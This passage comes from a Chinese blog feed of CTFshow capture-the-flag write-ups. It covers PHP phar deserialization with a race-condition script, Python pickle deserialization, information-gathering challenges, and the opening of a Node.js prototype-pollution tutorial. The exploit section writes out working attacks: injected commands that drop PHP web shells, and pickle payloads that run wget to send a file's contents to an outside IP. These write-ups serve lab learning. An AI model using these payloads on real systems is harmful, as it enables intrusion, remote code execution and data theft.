<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;evilfile)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>],<span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">checkevil</span>()===<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>], <span class="hljs-variable">$content</span>);<br>        <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>],<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>()).<span class="hljs-string">&#x27;.txt&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;work done&#x27;</span>;<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;where is flag?&#x27;</span>;<br>&#125;<br><br>where is flag?<br></code></pre></td></tr></table></figure><p>可以通过<code>filter</code>中的<code>__destruct</code>进行语句拼接利用<code>;</code>提前闭合执行语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?fn=a;<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span> &gt; orange.php;<br></code></pre></td></tr></table></figure><p>然后执行🐎就行了</p><h2 id="web276"><a class="markdownIt-Anchor" href="#web276"></a> web276</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">filter</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filecontent</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evilfile</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$fn</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;filecontent=<span class="hljs-variable">$fn</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkevil</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/php|\.\./i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;evilfile=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;filecontent))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;evilfile=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;evilfile;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;admin)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>],<span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">checkevil</span>()===<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>], <span class="hljs-variable">$content</span>);<br>        <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>],<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>()).<span class="hljs-string">&#x27;.txt&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;work done&#x27;</span>;<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;where is flag?&#x27;</span>;<br>&#125;<br><br>where is flag?<br></code></pre></td></tr></table></figure><p>根据题目进行分析由于又加了一个限制，admin也需要是true才行，考虑到下方的函数，可以尝试用phar包来进行反序列化</p><p>先绕过 checkevil 方法上传文件, 然后利用 copy 和 unlink 的时间差, 再利用一个正常的请求通过 phar:// 协议访问之前上传的文件, 触发反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">filter</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;123; echo \&#x27;&lt;?php system($_GET[1]);?&gt;\&#x27; &gt; 1.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evilfile</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">filter</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;exp.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//固定的的</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>); <span class="hljs-comment">//触发调用</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//随便写点什么生成个签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&#x27;http://8e3f6bfc-1b55-4266-9ce0-0c133676ade7.challenge.ctf.show/&#x27;</span><br><br>lock = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_phar</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    _ = requests.post(url + <span class="hljs-string">&#x27;?fn=phar.txt&#x27;</span>, data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unserialize_phar</span>():<br>    _ = requests.post(url + <span class="hljs-string">&#x27;?fn=phar://phar.txt&#x27;</span>, data=<span class="hljs-string">&#x27;123&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_shell</span>():<br>    <span class="hljs-keyword">global</span> lock<br>    res = requests.get(url + <span class="hljs-string">&#x27;1.php&#x27;</span>)<br>    <span class="hljs-keyword">if</span> res.status_code != <span class="hljs-number">404</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>        lock = <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> lock:<br>    t1 = threading.Thread(target=send_phar)<br>    t2 = threading.Thread(target=unserialize_phar)<br>    t3 = threading.Thread(target=check_shell)<br>    t1.start()<br>    t2.start()<br>    t3.start()<br></code></pre></td></tr></table></figure><p>然后访问执行就可以得到flag了</p><h2 id="web277"><a class="markdownIt-Anchor" href="#web277"></a> web277</h2><p>看源码有pickle说明应该是python的反序列化，正常的<code>__reduce__</code>就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RCE</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;wget http://8.130.42.113:XXXX/`cat flag`&#x27;</span>,))<br><br>obj = RCE()<br>payload = pickle.dumps(obj, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(base64.b64encode(payload))<br></code></pre></td></tr></table></figure><h2 id="web278"><a class="markdownIt-Anchor" href="#web278"></a> web278</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RCE</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.popen, (<span class="hljs-string">&#x27;wget http://8.130.42.113:xxxx/`cat flag`&#x27;</span>,))<br><br>obj = RCE()<br>payload = pickle.dumps(obj, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(base64.b64encode(payload))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow信息搜集&amp;爆破</title>
    <link href="/2024/10/26/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86&amp;%E7%88%86%E7%A0%B4/"/>
    <url>/2024/10/26/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86&amp;%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="web1"><a class="markdownIt-Anchor" href="#web1"></a> web1</h2><p>右键看源码</p><h2 id="web2"><a class="markdownIt-Anchor" href="#web2"></a> web2</h2><p>CTRL+shift+i</p><h2 id="web3"><a class="markdownIt-Anchor" href="#web3"></a> web3</h2><p>用bp抓包，看标头有flag</p><h2 id="web4"><a class="markdownIt-Anchor" href="#web4"></a> web4</h2><p>看一下robots.txt，再看/flagishere.txt</p><h2 id="web5"><a class="markdownIt-Anchor" href="#web5"></a> web5</h2><p>根据提示输入index.phps,打开看flag</p><h2 id="web6"><a class="markdownIt-Anchor" href="#web6"></a> web6</h2><p>根据提示输入www.zip，然后看index.php里面指向fl000g.txt，到这边拿到flag</p><h2 id="web7"><a class="markdownIt-Anchor" href="#web7"></a> web7</h2><p>根据提示输入/.git</p><h2 id="web8"><a class="markdownIt-Anchor" href="#web8"></a> web8</h2><p>输入/.svn，都是常见的泄露</p><h2 id="web9"><a class="markdownIt-Anchor" href="#web9"></a> web9</h2><p>根据提示，输入index.php.swp,vim常见的泄露</p><h2 id="web10"><a class="markdownIt-Anchor" href="#web10"></a> web10</h2><p>直接抓包吧，看cookie得到flag</p><h2 id="web11"><a class="markdownIt-Anchor" href="#web11"></a> web11</h2><p>直接使用命令： nslookup -qt=txt <a href="http://flag.ctfshow.com">flag.ctfshow.com</a></p><h2 id="web12"><a class="markdownIt-Anchor" href="#web12"></a> web12</h2><p>先去看robots.txt，知道一个/admin,默认管理员是admin，密码在网站下面372619038</p><h2 id="web13"><a class="markdownIt-Anchor" href="#web13"></a> web13</h2><p>划到最下面可以看到document,点进去给了文档</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">https://b8def508-478a-4a06-98e2-03816a76b5cb.challenge.ctf.show/system1103/login.php<br></code></pre></td></tr></table></figure><p>admin/admin1103</p><h2 id="web14"><a class="markdownIt-Anchor" href="#web14"></a> web14</h2><p>hint：不经意间泄露重要(editor)的信息,默认配置害死人</p><p>先去editor,发现插入的文件 ，在文件空间中找文件插入是服务器中的文件，于是浏览一下目录 在var/www/html目录 中，存在 一个nothinghere有一个文件 fl000g.txt 直接访问这个fl000g.txt 即可获得flag</p><h2 id="web15"><a class="markdownIt-Anchor" href="#web15"></a> web15</h2><p>提醒看邮箱</p><p><a href="mailto:1156631961@qq.com">1156631961@qq.com</a>，去qq看一下，得知地点西安，得到密码，在/admin里面进行，得到flag</p><h2 id="web16"><a class="markdownIt-Anchor" href="#web16"></a> web16</h2><p>测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p><p>/tz.php然后跟进?act=phpinfo</p><h2 id="web17"><a class="markdownIt-Anchor" href="#web17"></a> web17</h2><p>备份的sql文件会泄露敏感信息</p><p>所以 /backup.sql 下载一个数据库文件打开得到 flag</p><h2 id="web18"><a class="markdownIt-Anchor" href="#web18"></a> web18</h2><p>f12查看源码，然后根据提示进入 js 找到关键 score&gt;100，将得到的字符 Unicode 转换得到 “你赢了，去幺幺零点皮爱吃皮看看”，进入 110.php 得到 flag</p><h2 id="web19"><a class="markdownIt-Anchor" href="#web19"></a> web19</h2><p>根据提示，f12 查看源代码，根据逻辑 post 请求 <code>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code> 得到 flag</p><h2 id="web20"><a class="markdownIt-Anchor" href="#web20"></a> web20</h2><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p><p>根据提示 /db.mdb 打开得到 flag</p><h2 id="web21"><a class="markdownIt-Anchor" href="#web21"></a> web21</h2><p>进入环境直接弹出登录框，附件字典拿去 bp 爆破，随便输入一个密码抓包能发现进行了 base 编码，解码一下能发现是<code>用户:密码</code>这种形式，爆破的时候需要注意 base 编码。 admin:shark63</p><h2 id="web22"><a class="markdownIt-Anchor" href="#web22"></a> web22</h2><p>爆破子域名，子域名失效爆不出来了</p><h2 id="web23"><a class="markdownIt-Anchor" href="#web23"></a> web23</h2><p>分析代码：变量 token 被 md5 加密，它的第一位 = 第十四位 = 第十七位，化为整数后（第一位 + 第十四位 + 第十七位）/ 第一位 = 第三十一位，可获得 flag。bp 爆破 token，数字1202 得到 flag</p><h2 id="web24"><a class="markdownIt-Anchor" href="#web24"></a> web24</h2><p>php 伪随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">372619038</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><span class="hljs-meta">?&gt;</span><br><br>&gt;<span class="hljs-number">1155388967</span><br></code></pre></td></tr></table></figure><p>get 传入 r = 1155388967 得到 flag</p><h2 id="web25"><a class="markdownIt-Anchor" href="#web25"></a> web25</h2><p>直接看官p方法一致。</p><h2 id="web26"><a class="markdownIt-Anchor" href="#web26"></a> web26</h2><p>bp 登录页直接抓包，repeater 发送看 response 得到 flag</p><h2 id="web27"><a class="markdownIt-Anchor" href="#web27"></a> web27</h2><p>下载录取名单，对名单中缺失的部分进行爆破，选择日期模式，从1980 开始爆破，得出日期去学籍信息查询系统查询学号，登录教务管理系统得到 flag</p><h2 id="web28"><a class="markdownIt-Anchor" href="#web28"></a> web28</h2><p>一看目录有问题，对目录进行爆破，把2.txt 去掉使用 Cluster bomb 模式爆破从 0-100 的数字，查看状态码 200 的包得到 flag</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息搜集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析node.js原型链污染</title>
    <link href="/2024/10/20/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B5%85%E6%9E%90node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2024/10/20/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B5%85%E6%9E%90node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<p>参考链接:</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%96%B9%E6%B3%95%E6%9D%A5%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%94%9F%E6%88%90%E5%8E%9F%E5%9E%8B%E9%93%BE">继承与原型链 - JavaScript | MDN (mozilla.org)</a></p><p><a href="https://www.freebuf.com/articles/web/361333.html">https://www.freebuf.com/articles/web/361333.html</a></p><p><a href="https://ch0ico.fun/2024/08/11/ctfshow_NodeJS/">ctfshow_NodeJS | CH0ico</a></p><h2 id="0x01-prototype和proto"><a class="markdownIt-Anchor" href="#0x01-prototype和proto"></a> 0x01 prototype和proto</h2><p>在javaScript中，如果需要定义一个类，需要以定义&quot;构造函数&quot;的方式来定义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Test</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>()<br></code></pre></td></tr></table></figure><p>在其中，Test函数的内容，就是Test类的构造函数，而<code>this.bar</code>就是Test类的属性</p><p>类同时也必然有一些方法，类似就是<code>this.bar</code>,也可以将方法定义在构造函数内部</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Test</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">show</span> =<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)<br>&#125;<br>&#125;<br>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>()).<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>但这样会出现一个问题，当新建一个Test对象的时候，<code>this.show=func...</code>就会执行一次，这个<code>show</code>方法实际上绑定在对象上(bar)，而不是&quot;类&quot;上</p><p>想创建类的时候只创建一次<code>show</code>方法，这时候就需要用到原型(prototype)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Test</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>    <span class="hljs-title class_">Test</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">show</span>=<span class="hljs-keyword">function</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)<br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> test =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>()<br>test.<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>运行会出现1</p><p>可以理解为原型<code>prototype</code>是类<code>Test</code>的一个属性，而所有由<code>Test</code>实例化的对象都将拥有这个属性中的所有内容，包括变量和方法。上面代码中test对象，天生就具有<code>test.show</code>方法(也就是继承了)</p><p>可以通过<code>Test.prototype</code>来访问<code>Test</code>类的原型，但<code>Test</code>实例化的对象，是不可以通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>也就是<code>Test</code>类实例化出来的test对象，可以通过<code>test.proto</code>属性来访问Test类的原型，也就是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">test.<span class="hljs-property">__proto__</span> == <span class="hljs-title class_">Test</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span><br></code></pre></td></tr></table></figure><p>因此总结一下</p><ol><li><code>prototype</code>是一个类的属性，所有类的<strong>对象</strong>在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类<code>prototype</code>属性</li></ol><h2 id="0x02-javascript原型链继承"><a class="markdownIt-Anchor" href="#0x02-javascript原型链继承"></a> 0x02 JavaScript原型链继承</h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制</p><p>举个例子来说</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Orange</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span> = <span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Apple</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> = <span class="hljs-string">&quot;AAA&quot;</span>;<br>&#125;<br><br><span class="hljs-title class_">Apple</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br><br><span class="hljs-keyword">let</span> apple = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`a是:<span class="hljs-subst">$&#123;apple.a&#125;</span> <span class="hljs-subst">$&#123;apple.b&#125;</span>`</span>);<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/nodejs/2024-10-17180552.png" 